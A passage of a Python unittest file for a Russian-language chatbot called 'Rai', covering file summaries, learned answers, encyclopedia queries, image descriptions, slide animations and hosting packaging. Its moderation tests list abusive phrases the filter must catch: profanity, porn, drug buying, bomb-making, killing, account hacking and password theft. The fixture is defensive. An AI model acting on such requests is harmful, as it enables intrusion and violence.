        self.assertIn("бурый медведь", text)                      # текст с сайта попал на слайды
        self.assertTrue(any(s.get("pic", "").startswith("https://upload.wikimedia.org/taiga") for s in deck["slides"]))
        self.assertTrue(calls)

    def test_quality_score(self):
        import creative
        thin = creative.make_slides("Кошка", [{"title": "Кошка", "answers": ["Кошка — домашнее животное. Кошки любят спать."]}], max_slides=8)
        q = creative.deck_quality(thin, 8, "photo")
        self.assertLess(q["score"], 75)
        self.assertTrue(q["needs_text"] and q["needs_pics"])
        self.assertIn("нет фотографий", q["issues"])


class FilesLearningTest(unittest.TestCase):
    """Файлы любого типа (прочитаны в браузере, [[file]]) и самообучение: выученные ответы, 👍/👎, документы."""

    REPORT = ("Отчёт кружка робототехники за 2025 год\n\nВ кружке занимались 24 ученика из пятых–девятых классов.\n\n"
              "За год ребята собрали 12 роботов на Arduino и выиграли два городских конкурса.\n\nБюджет кружка составил 85 000 рублей.\n\n"
              "В следующем году планируем открыть вторую группу и купить 3D-принтер.")

    def setUp(self):
        import learning
        self.learning = learning
        self.saved = learning.export()
        learning.load({})
        self.tmp = tempfile.TemporaryDirectory()
        self.brain = Brain(learned_path=os.path.join(self.tmp.name, "learned.json"))

    def tearDown(self):
        self.learning.load(self.saved)
        self.tmp.cleanup()

    def ask(self, text, files=None):
        msg = text + ("\n[[file]]\n" + json.dumps(files, ensure_ascii=False) if files else "")
        return self.brain.answer(SUN, msg, session_id="f")

    def test_document_summary_and_question(self):
        doc = {"name": "отчёт.docx", "size": 805, "ext": "docx", "kind": "document", "label": "документ Word",
               "meta": {"размер": "805 байт", "слов": 45, "SHA-256": "ab" * 32}, "text": self.REPORT}
        r = self.ask("Что в этом файле? Расскажи главное", [doc])
        self.assertEqual(r["intent"], "file")
        self.assertIn("**Документ Word** · 805 байт", r["answer"])
        self.assertIn("собрали 12 роботов", r["answer"])
        a = self.ask("какой бюджет кружка", [doc])["answer"]
        self.assertIn("**Ответ по файлу:**", a)
        self.assertIn("> Бюджет кружка составил 85 000 рублей.", a)
        self.assertNotIn("24 ученика", a)            # лучшее место — без лишнего

    def test_tables_code_archive_binary(self):
        csv_file = {"name": "данные.csv", "ext": "csv", "kind": "text", "label": "таблица CSV", "meta": {},
                    "text": "Город;Население\nМосква;13 000 000\nМинск;2 000 000"}
        self.assertIn("| Москва | 13 000 000 |", self.ask("", [csv_file])["answer"])
        xlsx = {"name": "оценки.xlsx", "ext": "xlsx", "kind": "document", "label": "таблица Excel", "meta": {"листов": 1},
                "text": "", "tables": [{"name": "Оценки", "rows": [["Имя", "Оценка"], ["Аня", "5"], ["Боря", "4"]]}]}
        self.assertIn("**Оценки** — 3 строк, 2 столбцов", self.ask("", [xlsx])["answer"])
        code = {"name": "bot.py", "ext": "py", "kind": "code", "label": "код Python", "lang": "Python", "meta": {},
                "text": "import os\nclass Bot:\n    def run(self):\n        pass\ndef main():\n    Bot().run()\n"}
        a = self.ask("", [code])["answer"]
        for part in ("Классы: `Bot`", "Функции: `run`, `main`", "Подключает: `os`", "```python"):
            self.assertIn(part, a)
        exe = {"name": "program.exe", "ext": "exe", "kind": "binary", "label": "программа Windows (exe, dll)", "meta": {"SHA-256": "d8" * 32}, "text": ""}
        a = self.ask("", [exe])["answer"]
        self.assertIn("Программа Windows", a)
        self.assertIn("SHA-256: `d8d8", a)
        js = {"name": "config.json", "ext": "json", "kind": "text", "label": "JSON", "meta": {}, "text": '{"name": "rai", "version": 3}'}
        self.assertIn("Ключи: `name`, `version`", self.ask("", [js])["answer"])
        # мат в вопросе к файлу — всё равно нарушение; текст внутри файла — нет
        self.assertEqual(self.ask("иди нахуй", [js])["intent"], "violation")
        self.assertEqual(self.ask("", [dict(js, text="порно")])["intent"], "file")

    def test_learned_answers(self):
        q = "кто придумал теорию струн"
        self.assertIsNone(self.ask(q)["intent"])
        self.learning.add_answer(q, "Теорию струн начали развивать в конце 1960-х.", "neuro")
        r = self.ask("а кто придумал теорию струн?")             # «струн» не исправится в «стран»
        self.assertEqual(r["intent"], "learned")
        self.assertIn("Я выучил это раньше (ответ нейросети)", r["answer"])
        self.learning.forget(q)                                   # 👎
        self.assertNotEqual(self.ask(q)["intent"], "learned")
        self.learning.add_answer(q, "Новый ответ.", "user")      # 👍 снова учит
        self.assertIn("вы отметили 👍", self.ask(q)["answer"])
        self.assertEqual(self.ask("погода в москве")["intent"], "weather")   # готовые функции важнее

    def test_documents_are_remembered(self):
        self.learning.add_doc("отчёт.docx", self.REPORT)
        for q, want in [("сколько роботов собрал в кружке робототехники", "12 роботов"), ("какой бюджета кружка", "85 000"),
                        ("сколько учеников занималось", "24 ученика")]:
            r = self.ask(q)
            self.assertEqual(r["intent"], "learned_doc", q)
            self.assertIn("Из файла «отчёт.docx»", r["answer"])
            self.assertIn(want, r["answer"])
        data = self.learning.export()
        self.learning.load({})
        self.assertNotEqual(self.ask("какой бюджета кружка")["intent"], "learned_doc")
        self.learning.load(data)                                  # память браузера → снова знает
        self.assertEqual(self.ask("какой бюджета кружка")["intent"], "learned_doc")


class ModerationTest(unittest.TestCase):
    """Правила Rai: мат, 18+, наркотики, насилие, взлом, экстремизм — диалог останавливается; обычные слова не задеваются."""

    def test_catches(self):
        import moderation
        for text, cat in [("иди нахуй", "мат"), ("х*й тебе", "мат"), ("xyй", "мат"), ("б**ть", "мат"), ("заебал уже", "мат"),
                          ("скинь порно", "18+"), ("п0рно видео", "18+"), ("голые девушки фото", "18+"),
                          ("где купить мефедрон", "наркотики"), ("как вырастить коноплю", "наркотики"),
                          ("как сделать бомбу", "насилие"), ("как убить человека", "насилие"),
                          ("взломать аккаунт вк", "взлом"), ("как украсть пароль", "взлом"), ("зиг хайль", "экстремизм")]:
            found = moderation.check(text)
            self.assertIsNotNone(found, text)
            self.assertEqual(found["category"], cat, text)
        self.assertEqual(moderation.check("иди нахуй")["word"], "н***й")   # в админку — без мата целиком

    def test_ordinary_words_pass(self):
        import moderation
        for text in ["какое сегодня небо", "купи хлеба себе", "как употреблять витамины", "жидкость для стекла", "хохлома роспись",
                     "художник Шишкин", "хуже некуда", "что такое сексуальная революция", "кто такая Мэрилин Монро", "теракт 11 сентября",
                     "чем опасны наркотики", "как убить время", "хачапури рецепт", "защита сайта от взлома", "1488 год", "бляха муха",
                     "мандарины", "что такое секстант", "голой рукой", "напиши код на python", "сделай презентацию про космос", "Ебург"]:
            self.assertIsNone(moderation.check(text), text)

    def test_brain_stops_dialog(self):
        with tempfile.TemporaryDirectory() as tmp:
            brain = Brain(learned_path=os.path.join(tmp, "learned.json"))
            r = brain.answer(SUN, "иди нахуй", session_id="m")
            self.assertEqual(r["intent"], "violation")
            self.assertEqual(r["violation"]["category"], "мат")
            self.assertIn("Диалог остановлен", r["answer"])
            self.assertIn("rules.php", r["answer"])
            self.assertEqual(brain.answer(SUN, "хочу умереть", session_id="m")["intent"], "crisis")  # помощь, а не бан
            # текст со скриншота — не слова человека
            self.assertNotEqual(brain.answer(SUN, "что на скриншоте\n[[screen]]\nпорно сайт", session_id="m")["intent"], "violation")


class CompareTest(unittest.TestCase):
    """«Сравни A и B», «чем отличается A от B», «что лучше A или B» — таблица по двум темам, а не готовый ответ про Python и PHP."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.brain = Brain(learned_path=os.path.join(self.tmp.name, "learned.json"))

    def tearDown(self):
        self.tmp.cleanup()

    def test_parse_phrasings(self):
        import compare
        for text, pair in [("сравни python и javascript", ("python", "javascript")),
                           ("чем отличается java от c++", ("java", "c++")),
                           ("чем Марс отличается от Венеры?", ("Марс", "Венеры")),
                           ("разница между Пушкиным и Лермонтовым", ("Пушкиным", "Лермонтовым")),
                           ("что лучше кофе или чай", ("кофе", "чай")),
                           ("python vs go", ("python", "go"))]:
            self.assertEqual(compare.parse(text), pair, text)
        self.assertIsNone(compare.parse("привет как дела"))
        self.assertIsNone(compare.parse("сравни python и python"))

    def test_languages_table(self):
        r = self.brain.answer(SUN, "сравни python и javascript", session_id="c")
        a = r["answer"]
        self.assertEqual(r["intent"], "compare")
        self.assertIn("| | **Python** | **JavaScript** |", a)
        self.assertIn("| Появился | 1991 г. | 1995 г. |", a)
        self.assertIn('print("Привет, мир!")', a)
        self.assertNotIn("PHP", a)
        self.assertIn("Python — боты, ИИ;", a)  # чем отличаются, а не «оба — сайты»
        a = self.brain.answer(SUN, "чем отличается java от c++", session_id="c")["answer"]
        self.assertIn("**Java** | **C++**", a)

    def test_unknown_pair_falls_through(self):
        import compare
        self.assertIsNone(compare.answer("сравни флюмбрик и шмаргалку"))

    def test_lifespan_question_is_not_days_calculator(self):
        r = self.brain.answer(SUN, "сколько лет прожил Гагарин", session_id="c")
        self.assertNotIn("дн", r["answer"][:40])
        self.assertNotEqual(r["intent"], "tool")


class QuestionTest(unittest.TestCase):
    """Вопросы о темах энциклопедии: даты жизни, «какой высоты», «почему», «как работает» — точный ответ из статьи."""

    DATA = {"sections": ["Люди", "География", "Технологии"], "cats": [[0, "Люди"], [1, "Места"], [2, "Техника"]], "items": [
        ["Гагарин, Юрий Алексеевич", "советский космонавт", 0,
         "Юрий Алексеевич Гагарин (9 марта 1934, Клушино, Гжатский (ныне Гагаринский) район, Западная область — 27 марта 1968, "
         "возле села Новосёлово) — советский космонавт и военный лётчик, первый человек, совершивший космический полёт.", [], 200, ""],
        ["Пушкино", "город в России", 1, "Пушкино — город в России. Население — 112 807 чел.", [], 50, ""],
        ["Пушкин, Александр Сергеевич", "русский поэт", 0, "Александр Сергеевич Пушкин (26 мая [6 июня] 1799, Москва — "
         "29 января [10 февраля] 1837, Санкт-Петербург) — русский поэт, драматург и прозаик.", [], 150, ""],
        ["Ахматова, Анна Андреевна", "русская поэтесса", 0, "Анна Андреевна Ахматова (11 июня 1889, Одесса — 5 марта 1966, Домодедово) — "
         "русская поэтесса, переводчица и литературовед.", [], 100, ""],
        ["Путин, Владимир Владимирович", "российский государственный деятель", 0, "Владимир Владимирович Путин (род. 7 октября 1952, "
         "Ленинград) — российский государственный и политический деятель.", [], 300, ""],
        ["Эверест", "высочайшая гора Земли", 1, "Эверест (Джомолунгма) — высочайшая вершина Земли. Высота над уровнем моря — 8848,86 м. "
         "Расположен в Гималаях, на границе Непала и Китая.", [], 150, ""],
        ["Интернет", "всемирная система компьютерных сетей", 2, "Интернет — всемирная система объединённых компьютерных сетей для хранения "
         "и передачи информации. Работает на основе стека протоколов TCP/IP.", [], 200, ""],
        ["Небо", "пространство над Землёй", 1, "Небо — пространство над поверхностью Земли. Днём небо голубое из-за рассеяния "
         "солнечного света в атмосфере.", [], 120, ""],
        ["Эйнштейн, Альберт", "физик-теоретик", 0, "Альберт Эйнштейн (нем. Albert Einstein МФА:, 14 марта 1879, Ульм, Германская империя — "
         "18 апреля 1955, Принстон, США) — физик-теоретик, один из основателей современной теоретической физики.", [], 250, ""],
        ["Сталин, Иосиф Виссарионович", "советский государственный деятель", 0, "Иосиф Виссарионович Сталин (фамилия при рождении — "
         "Джугашвили, груз. იოსებ ჯუღაშვილი; 6 [18] декабря 1878, Гори — 5 марта 1953, Ближняя дача) — советский политический деятель.", [], 220, ""],
        ["Екатерина II", "императрица Всероссийская", 0, "Екатерина II Алексеевна (нем. Sophie Auguste Friederike; 21 апреля [2 мая] 1729, "
         "Штеттин — 6 [17] ноября 1796, Санкт-Петербург) — Императрица и Самодержица Всероссийская.", [], 180, ""],
        ["Нил", "река в Африке", 1, "Нил (араб. النيل, англ. Nile) — крупнейшая по протяжённости река в Африке (6670 км). "
         "Впадает в Средиземное море.", [], 150, ""],
    ]}

    def setUp(self):
        import encyclopedia
        self.enc = encyclopedia
        self.saved = (encyclopedia._data, encyclopedia._index)
        encyclopedia.load(data=self.DATA)
        self.tmp = tempfile.TemporaryDirectory()
        self.brain = Brain(learned_path=os.path.join(self.tmp.name, "learned.json"))

    def tearDown(self):
        self.enc._data, self.enc._index = self.saved
        self.tmp.cleanup()

    def q(self, text):
        r = self.enc.question(text)
        return r["text"].split("\n\n📚")[0] if r else None

    def test_life_dates(self):
        self.assertEqual(self.q("когда родился Гагарин"), "**Юрий Гагарин** родился **9 марта 1934** (Клушино, Гжатский район, Западная область).")
        self.assertEqual(self.q("сколько лет прожил Гагарин"), "**Юрий Гагарин** прожил **34 года**: 9 марта 1934 — 27 марта 1968.")
        self.assertEqual(self.q("где родился Гагарин"), "Место рождения — **Клушино, Гжатский район, Западная область** (Юрий Гагарин, 9 марта 1934).")
        self.assertIn("**Анна Ахматова** родилась **11 июня 1889**", self.q("когда родилась Ахматова"))
        # «Пушкин» в вопросе о жизни — поэт, а не город Пушкино; дата по новому стилю
        self.assertEqual(self.q("когда умер Пушкин"), "**Александр Пушкин** умер **10 февраля 1837 (по старому стилю — 29 января)** (Санкт-Петербург).")
        self.assertIn("прожил **37 лет**", self.q("сколько лет прожил Пушкин"))

    def test_age_of_living_person(self):
        import datetime
        t = datetime.date.today()
        age = t.year - 1952 - ((t.month, t.day) < (10, 7))
        a = self.q("сколько лет Путину")
        self.assertTrue(a.startswith("**Владимир Путин** родился 7 октября 1952 — сейчас ему **"), a)
        self.assertIn(f"**{age} ", a)

    def test_best_sentence(self):
        self.assertEqual(self.q("какой высоты Эверест"), "**Эверест:** Высота над уровнем моря — 8848,86 м.")
        self.assertIn("из-за рассеяния солнечного света", self.q("почему небо голубое"))
        self.assertTrue(self.q("как работает интернет").startswith("Интернет — всемирная система"))
        self.assertIn("Гималаях", self.q("где находится Эверест") or self.q("где расположен Эверест"))

    def test_dates_after_other_text_and_monarchs(self):
        self.assertEqual(self.q("где родился Эйнштейн"), "Место рождения — **Ульм, Германская империя** (Альберт Эйнштейн, 14 марта 1879).")
        self.assertEqual(self.q("когда родился Сталин"), "**Иосиф Сталин** родился **18 декабря 1878 (по старому стилю — 6 декабря)** (Гори).")
        self.assertIn("**Екатерина II** прожила **67 лет**", self.q("сколько лет прожила Екатерина II"))
        self.assertIn("**Екатерина II** умерла **17 ноября 1796", self.q("когда умерла Екатерина"))
        # скобки с написанием на других языках убираются; «длины» — вопрос, а не тема
        self.assertEqual(self.q("какой длины Нил"), "Нил — крупнейшая по протяжённости река в Африке (6670 км).")

    def test_questions_about_rai_need_you(self):
        self.assertEqual(self.brain.answer(SUN, "где ты родился", session_id="q")["intent"], "bot_age")
        r = self.brain.answer(SUN, "где родился Эйнштейн", session_id="q")
        self.assertEqual(r["intent"], "encyclopedia")
        self.assertIn("Ульм", r["answer"])

    def test_no_guessing(self):
        self.assertIsNone(self.q("когда умер Эверест"))            # не человек — не выдумываем
        self.assertIsNone(self.q("почему Эверест"))                # нет предложения-причины
        self.assertIsNone(self.q("сколько стоит флюмбрик"))
        self.assertIsNone(self.q("привет"))

    def test_brain_routing(self):
        r = self.brain.answer(SUN, "как работает интернет", session_id="q")
        self.assertEqual(r["intent"], "encyclopedia")       # а не «как искать ошибку в коде»
        r = self.brain.answer(SUN, "когда родился Гагарин", session_id="q")
        self.assertIn("9 марта 1934", r["answer"])           # день рождения, а не дата полёта из справочника
        self.assertEqual(self.brain.answer(SUN, "почему не работает код", session_id="q")["intent"], "debug")
        self.assertEqual(self.brain.answer(SUN, "сколько тебе лет", session_id="q")["intent"], "bot_age")
        self.assertIn("Нового года", self.brain.answer(SUN, "когда новый год", session_id="q")["answer"])

    def test_compare_people(self):
        import compare
        a = compare.answer("сравни Пушкина и Ахматову")
        self.assertIn("| | **Александр Пушкин** | **Анна Ахматова** |", a)
        self.assertNotIn("Пушкино", a)

    def test_builder_keeps_old_days_when_slow(self):
        import sys
        sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "tools"))
        import build_encyclopedia as b
        with mock.patch.object(b, "rest", lambda url, tries=4: {"events": []}), mock.patch.object(b, "DAYS_LIMIT", -1):
            days = b.on_this_day({"02-03": [[1999, "Событие из прошлой сборки."]]})
        self.assertEqual(days["02-03"], [[1999, "Событие из прошлой сборки."]])
        with mock.patch.object(b, "BUDGET", 0):
            self.assertEqual(b.ru_pages(["Москва"]), {})
            self.assertEqual(b.wikidata(["Q649"]), {})


class SightTest(unittest.TestCase):
    """Зрение Rai: что на картинке (понятия от модели CLIP в браузере) — ответ движка и вместе с текстом."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.brain = Brain(learned_path=os.path.join(self.tmp.name, "learned.json"))

    def tearDown(self):
        self.tmp.cleanup()

    def test_picture_without_text(self):
        seen = [{"labels": [{"ru": "закат", "p": 0.46, "group": "Небо и погода"}, {"ru": "солнце", "p": 0.21, "group": "Небо и погода"},
                            {"ru": "море", "p": 0.12, "group": "Природа"}, {"ru": "облака", "p": 0.02, "group": "Небо и погода"}],
                 "colors": [{"name": "оранжевый", "share": 0.4}, {"name": "синий", "share": 0.3}], "tone": "тёплые", "light": "светлая"}]
        r = self.brain.answer(SUN, "что на картинке\n[[screen]]\n\n[[vision]]\n" + json.dumps(seen, ensure_ascii=False), session_id="s")
        a = r["answer"]
        self.assertEqual(r["intent"], "screen")
        self.assertIn("Фото: **закат**, ещё видно: солнце, море.", a)  # облака 2% — слишком неуверенно
        self.assertIn("| солнце | Небо и погода | 21% |", a)
        self.assertIn("цвета: оранжевый, синий · тёплые тона · светлая картинка", a)
        self.assertNotIn("не нашёл текста", a)

    def test_picture_with_text_and_animal_fact(self):
        import encyclopedia
        saved = (encyclopedia._data, encyclopedia._index)
        encyclopedia.load(EncyclopediaTest.DATA)
        try:
            seen = [{"labels": [{"ru": "жираф", "p": 0.81, "group": "Животные"}, {"ru": "саванна", "p": 0.05, "group": "Природа"}], "colors": []}]
            a = self.brain.answer(SUN, "\n[[screen]]\nСколько будет 2+2 =\n[[vision]]\n" + json.dumps(seen, ensure_ascii=False), session_id="s")["answer"]
        finally:
            encyclopedia._data, encyclopedia._index = saved
        self.assertIn("Фото: **жираф**", a)
        self.assertIn("💡 **Жираф**: Жираф — парнокопытное млекопитающее", a)  # справка из энциклопедии
        self.assertLess(a.index("Что на картинке"), a.index("Текст со скриншота"))
        self.assertIn("2+2 = 4", a.replace(" + ", "+"))
        # без зрения (модель не загрузилась) — как раньше, только текст
        old = self.brain.answer(SUN, "\n[[screen]]\n", session_id="s")["answer"]
        self.assertIn("не нашёл текста", old)

    def test_attributes_known_things_and_parts(self):
        import sight
        seen = [{"labels": [{"ru": "башня", "p": 0.55, "group": "Город и здания"}, {"ru": "небо", "p": 0.2, "group": "Небо и погода"}],
                 "attrs": [{"key": "kind", "value": "фотография", "p": 0.9}, {"key": "place", "value": "на улице", "p": 0.97},
                           {"key": "time", "value": "ночью", "p": 0.8}, {"key": "weather", "value": "ясно", "p": 0.7},
                           {"key": "people", "value": "людей нет", "p": 0.9}, {"key": "view", "value": "общий план", "p": 0.8}],
                 "known": [{"title": "Эйфелева башня", "by": "photo", "score": 0.86}],
                 "regions": [{"where": "в центре", "ru": "башня", "p": 0.5}, {"where": "слева вверху", "ru": "ночное небо", "p": 0.6}],
                 "colors": [{"name": "чёрный", "share": 0.5}], "tone": "", "light": "тёмная"}]
        a = sight.describe(seen)
        self.assertIn("Фото на улице, ночью, ясно: **башня**, ещё видно: небо. Людей нет.", a)
        self.assertIn("🔎 **Узнал: Эйфелева башня** (очень похоже на фото из статьи)", a)
        self.assertIn("🧩 **По частям:** в центре — башня; слева вверху — ночное небо.", a)
        self.assertIn("общий план", a)
        # рисунок: про улицу, погоду и людей не говорим; людей по лицу не узнаём никогда
        drawing = [{"labels": [{"ru": "кошка", "p": 0.7, "group": "Животные"}], "attrs": [{"key": "kind", "value": "рисунок", "p": 0.8},
                    {"key": "place", "value": "на улице", "p": 0.9}, {"key": "people", "value": "один человек", "p": 0.9}],
                    "known": [{"title": "Пушкин, Александр Сергеевич", "by": "photo", "score": 0.95}]}]
        b = sight.describe(drawing)
        self.assertIn("Рисунок: **кошка**.", b)
        self.assertNotIn("Пушкин", b)
        self.assertIn("узнал", sight.summary(seen))

    @unittest.skipUnless(__import__("shutil").which("node"), "нет Node.js")
    def test_vision_js_syntax_and_wiring(self):
        import subprocess
        base = os.path.dirname(os.path.abspath(__file__))
        self.assertEqual(subprocess.run(["node", "--check", os.path.join(base, "vision.js")]).returncode, 0)
        with open(os.path.join(base, "index.html"), encoding="utf-8") as fh:
            page = fh.read()
        self.assertIn('<script src="vision.js"></script>', page)
        self.assertIn("RaiVision.lookAll", page)
        self.assertIn("[[vision]]", page)


class PageBootTest(unittest.TestCase):
    """Python-код, который страница запускает в браузере (внутри JS-шаблона `...`), должен разбираться Python:
    «\\n» внутри шаблона JavaScript превращает в перевод строки — так однажды сломался запуск Rai."""

    @unittest.skipUnless(__import__("shutil").which("node"), "нет Node.js")
    def test_embedded_python_parses(self):
        import ast
        import subprocess
        base = os.path.dirname(os.path.abspath(__file__))
        script = ("const h=require('fs').readFileSync(process.argv[1],'utf8');const i=h.indexOf('pyodide.runPython(`');"
                  "const j=h.indexOf('`);',i);const body=h.slice(i+'pyodide.runPython(`'.length,j).replace(/\\$\\{[^}]*\\}/g,'None');"
                  "process.stdout.write(eval('`'+body+'`'));")
        src = subprocess.run(["node", "-e", script, os.path.join(base, "index.html")], capture_output=True, text=True, check=True).stdout
        self.assertIn("def rai_ask", src)
        ast.parse(src)


class PptxMotionTest(unittest.TestCase):
    """Переходы и анимации попадают внутрь .pptx (PptxGenJS их не умеет — pptx.js дописывает XML слайдов)."""

    @unittest.skipUnless(__import__("shutil").which("node"), "нет Node.js")
    def test_transitions_and_animations(self):
        import io
        import subprocess
        import zipfile
        from xml.dom import minidom
        slide = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><p:sld xmlns:a="a" xmlns:p="p"><p:cSld><p:spTree>'
                 '<p:sp><p:nvSpPr><p:cNvPr id="2" name="rai-a-1-rise"></p:cNvPr></p:nvSpPr></p:sp>'
                 '<p:pic><p:nvPicPr><p:cNvPr id="3" name="rai-a-3-zoom" descr=""/></p:nvPicPr></p:pic>'
                 '<p:sp><p:nvSpPr><p:cNvPr id="4" name="rai-a-2-wipe"></p:cNvPr></p:nvSpPr></p:sp>'
                 '<p:sp><p:nvSpPr><p:cNvPr id="5" name="Фон"></p:cNvPr></p:nvSpPr></p:sp>'
                 '</p:spTree></p:cSld><p:clrMapOvr><a:masterClrMapping/></p:clrMapOvr></p:sld>')
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
            z.writestr("[Content_Types].xml", "<Types/>")
            z.writestr("ppt/slides/slide1.xml", slide)
            z.writestr("ppt/slides/slide2.xml", slide.replace("rai-a-", "x-"))
        base = os.path.dirname(os.path.abspath(__file__))
        script = ("const fs=require('fs'),vm=require('vm');global.window={};vm.runInThisContext(fs.readFileSync(process.argv[1],'utf8'));"
                  "const u8=new Uint8Array(fs.readFileSync(0));const parts=window.RaiPptx.addMotion(u8,{slides:[{transition:'zoom'},{}]});"
                  "process.stdout.write(Buffer.concat(parts.map(p=>Buffer.from(p.buffer,p.byteOffset,p.byteLength))));")
        out = subprocess.run(["node", "-e", script, os.path.join(base, "pptx.js")], input=buf.getvalue(), capture_output=True, check=True).stdout
        with zipfile.ZipFile(io.BytesIO(out)) as z:
            self.assertIsNone(z.testzip())  # контрольные суммы сходятся
            first, second = z.read("ppt/slides/slide1.xml").decode(), z.read("ppt/slides/slide2.xml").decode()
        minidom.parseString(first)
        self.assertIn('<p:transition spd="med"><p:zoom dir="in"/></p:transition><p:timing>', first)
        self.assertLess(first.index("</p:clrMapOvr>"), first.index("<p:transition"))
        # порядок появления: 2 (rise) → 4 (wipe) → 3 (zoom); фон не анимируется
        self.assertEqual([int(x) for x in __import__("re").findall(r'presetClass="entr".*?spid="(\d+)"', first)], [2, 4, 3])
        self.assertNotIn('spid="5"', first)
        self.assertIn('<p:bldP spid="2" grpId="0" animBg="1"/><p:bldP spid="4" grpId="0" animBg="1"/></p:bldLst>', first)
        self.assertIn('<p:transition spd="slow"><p:fade/></p:transition>', second)  # без меток — только переход
        self.assertNotIn("<p:timing>", second)


class DesktopTest(unittest.TestCase):
    """Приложение для компьютера (desktop/): имена файлов совпадают с кнопками сайта, обновления — GitHub и хостинг."""

    def test_config_matches_site(self):
        base = os.path.dirname(os.path.abspath(__file__))
        with open(os.path.join(base, "desktop", "package.json"), encoding="utf-8") as fh:
            pkg = json.load(fh)
        build = pkg["build"]
        self.assertEqual([p["provider"] for p in build["publish"]], ["github", "generic"])
        self.assertEqual(build["publish"][1]["url"], "https://rai.rteam.info/app/")
        names = {build["win"]["artifactName"].replace("${ext}", "exe"),
                 build["appImage"]["artifactName"], build["deb"]["artifactName"]}
        names |= {build["mac"]["artifactName"].replace("${arch}", a).replace("${ext}", e) for a in ("arm64", "x64") for e in ("dmg", "zip")}
        with open(os.path.join(base, "hosting", "rai", "app.php"), encoding="utf-8") as fh:
            site = set(re.findall(r"'(Rai-[\w.-]+)'", fh.read()))
        self.assertEqual(site, names)  # каждая кнопка «Скачать» ведёт на файл, который собирается
        with open(os.path.join(base, ".github", "workflows", "desktop.yml"), encoding="utf-8") as fh:
            flow = fh.read()
        for word in ("windows-latest", "macos-latest", "ubuntu-latest", "softprops/action-gh-release", "app/", "--publish never"):
            self.assertIn(word, flow)
        with open(os.path.join(base, "desktop", "preload.js"), encoding="utf-8") as fh:
            self.assertIn('pyodide: "rai://app/pyodide/"', fh.read())
        with open(os.path.join(base, "index.html"), encoding="utf-8") as fh:
            page = fh.read()
        self.assertIn("window.RaiApp.pyodide", page)  # сайт в приложении берёт Python из приложения
        self.assertIn('id="appLink"', page)

    @unittest.skipUnless(__import__("shutil").which("node"), "нет Node.js")
    def test_main_process_syntax(self):
        import subprocess
        base = os.path.dirname(os.path.abspath(__file__))
        for name in ("main.js", "preload.js", os.path.join("scripts", "prepare.js")):
            r = subprocess.run(["node", "--check", os.path.join(base, "desktop", name)], capture_output=True, text=True)
            self.assertEqual(r.returncode, 0, r.stderr)


class HostingTest(unittest.TestCase):
    """Пакет для хостинга и PHP: свой сервер нейросети (ai.php) и посредник для интернета (net.php)."""

    def test_package(self):
        import make_hosting
        with tempfile.TemporaryDirectory() as out:
            with mock.patch.dict(os.environ, {"GOOGLE_CLIENT_SECRET": "", "SSO_SECRET": "", "PLATEGA_SECRET": "", "ADMIN_API_KEY": ""}):
                make_hosting.build(out)
            rai = os.path.join(out, "rai.rteam.info")
            # главная с тарифами — index.php, сам Rai — chat.html (index.html нет, чтобы главной была index.php)
            for name in ("index.php", "chat.html", "limits.php", "pay.php", "pay_callback.php", "admin_api.php", "ai.php", "net.php", "login.php", "config.php"):
                self.assertTrue(os.path.isfile(os.path.join(rai, name)), name)
            self.assertFalse(os.path.exists(os.path.join(rai, "index.html")))
            for name in ("download.php", "app.php", os.path.join("app", ".htaccess"), os.path.join("app", "web.config"), os.path.join("app", "index.php")):
                self.assertTrue(os.path.isfile(os.path.join(rai, name)), name)  # кнопки «Скачать приложение» и папка для его файлов
            with open(os.path.join(rai, "config.php"), encoding="utf-8") as fh:
                self.assertIn("ВСТАВЬТЕ_СЕКРЕТНЫЙ_КЛЮЧ_PLATEGA", fh.read())  # секреты Platega — только на хостинге
            for root, _, files in os.walk(out):
                for f in files:  # на хостинге только PHP и HTML (+ необязательные настройки сервера)
                    self.assertTrue(f.endswith((".php", ".html")) or f in (".htaccess", "web.config", "ПРОЧТИ.txt"), f)
            if os.path.exists(os.path.join(os.path.dirname(os.path.abspath(__file__)), "medicines.json")):
                self.assertGreater(len(json.loads(make_hosting.read_kb(os.path.join(rai, "meds.php")))["items"]), 1000)
                with open(os.path.join(rai, "chat.html"), encoding="utf-8") as fh:
                    self.assertIn('window.RAI_MEDS_URL = "meds.php"', fh.read())
            # нейросеть AI Studio — та же neuro.js, отдельным файлом .php (на хостинге только PHP и HTML)
            studio = os.path.join(out, "aistudio.rteam.info")
            with open(os.path.join(studio, "assets", "neuro.php"), encoding="utf-8") as fh:
                neuro = fh.read()
            self.assertEqual(neuro.count("<?"), 1)
            self.assertIn("application/javascript", neuro)
            self.assertIn("window.RaiNeuro", neuro)
            with open(os.path.join(studio, "studio.php"), encoding="utf-8") as fh:
                page = fh.read()
            for part in ('src="assets/neuro.php"', "assets/studio_ai.php", 'id="aiMode"', 'id="neuroHow"', 'id="stopBtn"'):
                self.assertIn(part, page)
            with open(os.path.join(rai, "chat.html"), encoding="utf-8") as fh:
                page = fh.read()
            self.assertIn("ai.php", page)
            self.assertIn("window.RaiNeuro", page)
            self.assertIn("limits.php", page)
            # энциклопедия на хостинге — отдельный kb.php (кэшируется браузером), а не внутри chat.html
            self.assertIn('window.RAI_KB_URL = "kb.php"', page)
            self.assertNotIn('id="rai-kb"', page)
            self.assertIn('window.RAI_VISION_URL = "vision.php"', page)  # словарь зрения — отдельным файлом
            if os.path.exists(os.path.join(os.path.dirname(os.path.abspath(__file__)), "vision_labels.json")):
                self.assertEqual(len(json.loads(make_hosting.read_kb(os.path.join(rai, "vision.php")))["labels"]), 502)
            if os.path.exists(os.path.join(os.path.dirname(os.path.abspath(__file__)), "encyclopedia.json")):
                with open(os.path.join(rai, "kb.php"), encoding="utf-8") as fh:
                    kb = fh.read()
                self.assertEqual(kb.count("<?"), 1)  # внутри данных PHP не открывается
                self.assertIn("__halt_compiler();", kb)  # данные — сжатые, текстом после __halt_compiler
                self.assertRegex(kb.split("__halt_compiler();", 1)[1], r"^[A-Za-z0-9+/=\n]+$")
                self.assertTrue(json.loads(make_hosting.read_kb(os.path.join(rai, "kb.php")))["items"])

    @unittest.skipUnless(__import__("shutil").which("php"), "нет PHP")
    def test_studio_neural_sites(self):
        """AI Studio: сайт от нейросети — «тексты + дизайн студии» (save_spec) и «весь код» (save_html), очистка и правки."""
        import shutil
        import subprocess
